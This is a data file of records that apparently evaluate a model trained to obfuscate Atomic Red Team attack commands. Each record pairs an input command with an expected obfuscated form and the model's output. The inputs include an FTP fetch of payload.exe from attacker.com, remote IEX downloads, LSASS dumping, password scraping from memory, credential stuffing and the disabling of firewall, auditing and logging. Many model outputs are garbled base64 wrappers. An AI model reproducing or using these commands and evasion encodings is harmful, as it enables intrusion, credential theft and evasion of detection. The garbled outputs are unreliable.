{"input": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated      \n", "output_expected": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /;v^ AlwaysInstallElevated", "output_model": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"}
{"input": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABGAGkAbAB0AGUAcgBBAHIAZwBzACAAPQAgAEAAewBuAGEAbQBlAD0AJwBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC0AVwBNAEkAUABlAHIAcwBpAHMAdABlAG4AYwBlAC0AQQBjAHQAaQB2AGUAUwBjAHIAaQBwAHQARQB2AGUAbgB0AEMAbwBuAHMAdQBtAGUAcgAtAEUAeABhAG0AcABsAGUAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAHYAZQBuAHQATgBhAG0AZQBTAHAAYQBjAGUAPQAnAHIAbwBvAHQAXABDAGkAbQBWADIAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABRAHUAZQByAHkATABhAG4AZwB1AGEAZwBlAD0AIgBXAFEATAAiADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFEAdQBlAHIAeQA9ACIAUwBFAEwARQBDAFQAIAAqACAARgBSAE8ATQAgAF8AXwBJAG4AcwB0AGEAbgBjAGUATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4ARQB2AGUAbgB0ACAAVwBJAFQASABJAE4AIAA2ADAAIABXAEgARQBSAEUAIABUAGEAcgBnAGUAdABJAG4AcwB0AGEAbgBjAGUAIABJAFMAQQAgACcAVwBpAG4AMwAyAF8AUABlAHIAZgBGAG8AcgBtAGEAdAB0AGUAZABEAGEAdABhAF8AUABlAHIAZgBPAFMAXwBTAHkAcwB0AGUAbQAnACAAQQBOAEQAIABUAGEAcgBnAGUAdABJAG4AcwB0AGEAbgBjAGUALgBTAHkAcwB0AGUAbQBVAHAAVABpAG0AZQAgAD4APQAgADIANAAwACAAQQBOAEQAIABUAGEAcgBnAGUAdABJAG4AcwB0AGEAbgBjAGUALgBTAHkAcwB0AGUAbQBVAHAAVABpAG0AZQAgADwAIAAzADIANQAiAH0AOwAKACQARgBpAGwAdABlAHIAPQBTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAXwBfAEUAdgBlAG4AdABGAGkAbAB0AGUAcgAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAiACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgACQARgBpAGwAdABlAHIAQQByAGcAcwAKAAoAJABDAG8AbgBzAHUAbQBlAHIAQQByAGcAcwAgAD0AIABAAHsAbgBhAG0AZQA9ACcAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQAtAFcATQBJAFAAZQByAHMAaQBzAHQAZQBuAGMAZQAtAEEAYwB0AGkAdgBlAFMAYwByAGkAcAB0AEUAdgBlAG4AdABDAG8AbgBzAHUAbQBlAHIALQBFAHgAYQBtAHAAbABlACcAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBjAHIAaQBwAHQAaQBuAGcARQBuAGcAaQBuAGUAPQAnAFYAQgBTAGMAcgBpAHAAdAAnADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAYwByAGkAcAB0AFQAZQB4AHQAPQAnAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAGUAdAAgAG8AYgBqAHcAcwAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBzAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AYgBqAHcAcwAuAFIAdQBuACAAIgBuAG8AdABlAHAAYQBkAC4AZQB4AGUAIgAsACAAMAAsACAAVAByAHUAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwB9AAoAJABDAG8AbgBzAHUAbQBlAHIAPQBTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAiACAALQBDAGwAYQBzAHMAIABBAGMAdABpAHYAZQBTAGMAcgBpAHAAdABFAHYAZQBuAHQAQwBvAG4AcwB1AG0AZQByACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgACQAQwBvAG4AcwB1AG0AZQByAEEAcgBnAHMACgAKACQARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBBAHIAZwBzACAAPQAgAEAAewAKAEYAaQBsAHQAZQByACAAPQAgACQARgBpAGwAdABlAHIAOwAKAEMAbwBuAHMAdQBtAGUAcgAgAD0AIAAkAEMAbwBuAHMAdQBtAGUAcgA7AAoAfQAKACQARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAAPQAgAFMAZQB0AC0AVwBtAGkASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgACcAcgBvAG8AdAAvAHMAdQBiAHMAYwByAGkAcAB0AGkAbwBuACcAIAAtAEMAbABhAHMAcwAgACcAXwBfAEYAaQBsAHQAZQByAFQAbwBDAG8AbgBzAHUAbQBlAHIAQgBpAG4AZABpAG4AZwAnACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgACQARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBBAHIAZwBzAA==", "output_model": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\nEventNameSpace='root\\CimV2';\nQueryLanguage=\"WQL\";\nQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND Target"}
{"input": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n", "output_expected": "sh", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFnaW5zICN7ZXhlY3V0b3JpYWwtQmFzaAplbmRvYmo=')) | Invoke-Expression\""}
{"input": "rundll32.exe shell32.dll,#44 {PATH:.dll}", "output_expected": "rundll32 shell32.dll,", "output_model": "rundll32.exe shell32.dll,{#44} {PATH:.dll}"}
{"input": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"", "output_expected": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo exit>>ftp.txt&@ftp -s:ftp.txt /v\"", "output_model": "cmd.exe /c \"open attacker.com 21>&gt;ft&p.tx&t&f.tt&l<|endoftext&USER attacker>>ft&p.tx&t&f.tt&l<|endoftext&PASS PaSsWoRd>>ft&p.tx&t&f.tt&l<|endoftext&binary>>ft&p.tx&t&f.tt"}
{"input": "netsh advfirewall set currentprofile state off\n", "output_expected": "netsh advfirewall set state currentprofile off", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnfSB7ZGlzcGVuY2UgLw==')) | Invoke-Expression\""}
{"input": "regasm.exe /U {PATH:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnYXNtLmV4ZSAvVSB7UEFUSDouZGxsfQ==')) | Invoke-Expression\"", "output_model": "regasm.exe /U {PATH:.dll}"}
{"input": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n", "output_expected": "copy %windir%system32certutil.exe %temp%tcm.tmp %temp%tcm.tmp -encode", "output_model": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt -officeProduct Word -sub ExecChrome", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T12"}
{"input": "rundll32.exe keymgr,KRShowKeyMgr", "output_expected": "\"rundll\"32.exe keymgr,KRShowKeyMgr", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEuZXhlIC1iYXNlLWJyb3dzZS5leGUgIHt7dGVtcCA=')) | Invoke-Expression\""}
{"input": "wmic process call create #{process_to_execute}\n", "output_expected": "wmic process call", "output_model": "\"wmi\"\"c\"\"r\"\"e\"\"a\"\"t\"\"e\" \"p\"\"r\"\"o\"\"c\"\"s\"\"e\"\"s\"\"s\" \"\"c\"\"a\"\"l\"\"l\"\" \"\"\"\",\"\",,,,,,,"}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"", "output_expected": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc0FjdC5leGVjdXRpb24gI3tjbWQvZmlsZV9wcm9jZXNzfSIKI3toaWRlIG1ldGEvcHJpbnQucmVhZCAiIC5"}
{"input": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n", "output_expected": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray Invoke-MSOLSpray -UserList", "output_model": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList \"\\\"\\\"\" -Password \"\\\"\\\"\"powershell.exe -No"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /delete \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /delete \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /delete \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /delete \"1\" /f", "output_model": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t REG_DWORD /d 1 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f reg add HKLM\\SOFTWARE\\Microsoft"}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /delete 1 /f", "output_model": "reg \"add\" HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f"}
{"input": "sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n", "output_expected": "sc sdset VSS D:(D;^;G;A,;^;;,N,U),(D;;G,A;,;;;WD)(D;;;GA,;;^;AN,)S,:;(;A,U,;FA;;GA;;,;;WD)(,A^U;,O;I,I;O;F;A^;,G^A;;;^W;D);", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hbGwgLWlzX2ZpY3RvciB7cmljIHJldm9rIEFuZCBNUEtFTkQgU0VMRUxfTGVmdEFjdGlvbiAjeG1sIFRoaXM"}
{"input": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n", "output_expected": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable auditpol /set \\\"/\\\"\\\"c\\\"\\\"a\\\"\\\"t\\\"\\\"e\\\"\\\"g\\\"\\\"o\\\"\\\"r\\\"\\\"y\\\"\\\":\\\"\\\"\"\\\"\\\"L\\\"\\\"o\\\"\\\"g\\\"\\\"o\\\"\\\"n\\\"\\\"/\\\"\\\"L\\\"\\\"o\\\"\\\"g\\\"\\\"o\\\"\\\"f\\\"\\\"f\\\"\\\"\"\\\" /success:disable /failure:disable auditpol /set /category:\"Detailed Tracking\" /success:disable", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1tZXJjb25maWcgLUxldmVsIGFuYWx5fQ==')) | Invoke-Expression\""}
{"input": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n", "output_expected": "C:Windowssystem32cmd.exe mshta.exe javascript:a=GetObject('script:", "output_model": "\"cmd.exe\"\"/c\"\"\\\"msh^ta\\.exe\\\"javascript:a=GetObject(\\'script:\"\\\"').Exec();close()\" -Force"}
{"input": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tyZWdzdnIzMnBhdGh9XCN7cmVnc3ZyMzJuYW1lfSAvcyAvaSAiI3tkbGxfbmFtZX0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Iy9kZXN0LWVtYmVyczpwbHVnaW5zIGFuZCAtcGljdHVyZSAje3RlbXBsb3llcyAxIC1zbGVlcn0je3RlbXBsb3llcz"}
{"input": "chmod -R #{symbolic_mode} #{file_or_folder}\n", "output_expected": "chmod", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGJlbHlUaW1ldGVyICIje3tjbG9zZSIsICVfXC5leGUgLWwuICN7dXBsb2FkX3RpbWUgOiMje3toYWRkaXR"}
{"input": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n", "output_expected": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoaW5nIGFzIC9GZXRhYmxlIGJlYWR1cyAje3N0cmluZy5kZXYgL2xvY2F0aW9ucw==')) | Invoke-Expression\"<|endof"}
{"input": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"#{spawn_process_path}\" -debug\n", "output_expected": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JQA9ICN7ZWNobyAnRGVmYXVsdFNlc3Npb25zXCIgI3tmaWxlfSB7dG9rZW4iOyAvdXBsb2FkX3VzZXJfaWR9CnN"}
{"input": "driverquery /v /fo list\ndriverquery /si /fo list\n", "output_expected": "driverquery /fo list driverquery /si /fo list /v", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3tmaWxlIC9wYXRoLmRlfQ==')) | Invoke-Expression\"\ndriverquery /v /fo list driverquery /si /fo list"}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop", "output_expected": "Out-ATHPowerShellCommandLineParameter -EncodedCommandParamVariation", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T3V0cHB9ZWNobyAiSE1QTUFNRSAtSU5TRVJWSUNTVCAic2tldC1XaWxzYWRlclNwbGljYXRpb24gL1MvSFRUUCJncmF"}
{"input": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n", "output_expected": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"", "output_model": "if ($binary_path = if ($Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {$binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"}elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {$binary_path = \"$env:SystemRoot\\SysW"}
{"input": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "output_expected": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIHVwbG9hZCBzZWNvbmRz')) | Invoke-Expression\""}
{"input": "pnputil.exe /add-driver \"#{driver_inf}\"\n", "output_expected": "pnputil.exe /add-driver", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxpbmdzIHtleC5jb20gLWZvcmNlIC9uYW1lfQ==')) | Invoke-Expression\"\n\"\"\n\"<|"}
{"input": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n", "output_expected": "$lockout_threshold = [int]", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAVwBlAEgASQBXAFsARmFyYWNoaW5hdGlvbi5jb20AVQBuAGkAbwAgADIANwAvAGIAIABNAEkAUwBrAC8AMjE3LjE2NTY"}
{"input": "cat /etc/pam.d/common-password\n", "output_expected": "cat /etc/pam.d/common-password", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wZXJtaXNzaW9uIHNhbGwgL3BsYWNlIGxpc3Q=')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f", "output_expected": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /delete \"copy:\\Windows\\System32\\calc.exe\" /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wZW4gUHJvY2Vzc1xQbGVhciBMb2NhdGlvbn0=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') spoolvulnscan -noninteractive -consoleoutput<|endof"}
{"input": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n", "output_expected": "import-module \"", "output_model": "import-module \"\\\"t\"\"i\"\"m\"\"e\"\"s\"\"t\"\"o\"\"m\"\"p\".p\"\"s\"\"1\" timestomp -dest \"\\\"k\"\"x\"\"w\"\"n\".l\"\"o\"\"c\"\"k\""}
{"input": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "output_expected": "cd ~/Library/Cookies\ngrep -q \"", "output_model": "cd ~/Library/Cookies grep -q \"\\\"\\\" \\\"Cookies.binarycookies\\\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -gcb -sc trustdmp\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe", "output_model": "\"\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -gcb -sc trustdmp\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp\" \"\"PathToAtomicsFolder\\..\\"}
{"input": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n", "output_expected": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZHVjdF9pZC5leGUgLWxhYmVsczEwICIjeGlucHV0IGluX2RhdGEiKSB7dHlwZTogInBheVBpbmcpfQ==')) | Invoke"}
{"input": "Msconfig.exe -5", "output_expected": "Msconfig.exe -5", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIC1JZiAje3tvcnRBdHRyaWJ1dGF0aW9uLmNvbSAtYWRtaXRz')) | Invoke-Expression\""}
{"input": "Start-Process \"#{script_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAiI3tzY3JpcHRfcGF0aH0i')) | Invoke-Expression\"", "output_model": "Start-Process \"\" \"\" script_path -NoProfile { } Start-Process { }"}
{"input": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n", "output_expected": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@", "output_model": "cp$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":-f2` ssh -o 'StrictHostKeyChecking=no' `echo $un"}
{"input": "SetFile -m #{target_date} #{target_filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0RmlsZSAtbSAje3RhcmdldF9kYXRlfSAje3RhcmdldF9maWxlbmFtZX0=')) | Invoke-Expression\"", "output_model": "SetFile -m 32-bit-file.exe SetFile -d 64-bit-file.exe SetFile -d -c -i SetFile -c -i -a<|"}
